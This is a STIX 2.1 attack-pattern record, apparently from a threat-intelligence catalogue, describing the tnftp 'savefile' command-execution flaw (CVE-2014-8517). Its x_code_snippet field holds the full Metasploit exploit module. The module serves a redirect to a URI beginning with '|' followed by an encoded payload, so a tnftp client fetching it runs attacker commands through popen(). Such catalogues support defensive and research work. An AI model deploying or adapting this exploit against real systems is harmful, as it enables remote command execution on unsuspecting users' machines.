{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f058674-6dc1-49f1-a0e5-75d10ce3c6c8",
    "created": "2024-08-14T17:14:58.423739Z",
    "modified": "2024-08-14T17:14:58.423743Z",
    "name": "tnftp \"savefile\" Arbitrary Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in tnftp's handling of the resolved output filename - called \"savefile\" in the source - from a requested resource.  If tnftp is executed without the -o command-line option, it will resolve the output filename from the last component of the requested resource.  If the output filename begins with a \"|\" character, tnftp will pass the fetched resource's output to the command directly following the \"|\" character through the use of the popen() function. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/tnftp_savefile.rb",
            "external_id": "tnftp_savefile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8517"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q4/459"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'tnftp \"savefile\" Arbitrary Command Execution',\n      'Description' => %q{\n        This module exploits an arbitrary command execution vulnerability in\n        tnftp's handling of the resolved output filename - called \"savefile\" in\n        the source - from a requested resource.\n\n        If tnftp is executed without the -o command-line option, it will resolve\n        the output filename from the last component of the requested resource.\n\n        If the output filename begins with a \"|\" character, tnftp will pass the\n        fetched resource's output to the command directly following the \"|\"\n        character through the use of the popen() function.\n      },\n      'Author' => [\n        'Jared McNeill', # Vulnerability discovery\n        'wvu' # Metasploit module\n      ],\n      'References' => [\n        ['CVE', '2014-8517'],\n        ['URL', 'https://seclists.org/oss-sec/2014/q4/459']\n      ],\n      'DisclosureDate' => '2014-10-28',\n      'License' => MSF_LICENSE,\n      'Platform' => 'unix',\n      'Arch' => ARCH_CMD,\n      'Privileged' => false,\n      'Payload' => {'BadChars' => '/'},\n      'Targets' => [['ftp(1)', {}]],\n      'DefaultTarget' => 0\n    ))\n  end\n\n  def on_request_uri(cli, request)\n    unless request['User-Agent'] =~ /(tn|NetBSD-)ftp/\n      print_status(\"#{request['User-Agent']} connected\")\n      send_not_found(cli)\n      return\n    end\n\n    if request.uri.ends_with?(sploit)\n      send_response(cli, '')\n      print_good(\"Executing `#{payload.encoded}'!\")\n      report_vuln(\n        :host => cli.peerhost,\n        :name => self.name,\n        :refs => self.references,\n        :info => request['User-Agent']\n      )\n    else\n      print_status(\"#{request['User-Agent']} connected\")\n      print_status('Redirecting to exploit...')\n      send_redirect(cli, sploit_uri)\n    end\n  end\n\n  def sploit_uri\n    (get_uri.ends_with?('/') ? get_uri : \"#{get_uri}/\") +\n      Rex::Text.uri_encode(sploit, 'hex-all')\n  end\n\n  def sploit\n    \"|#{payload.encoded}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}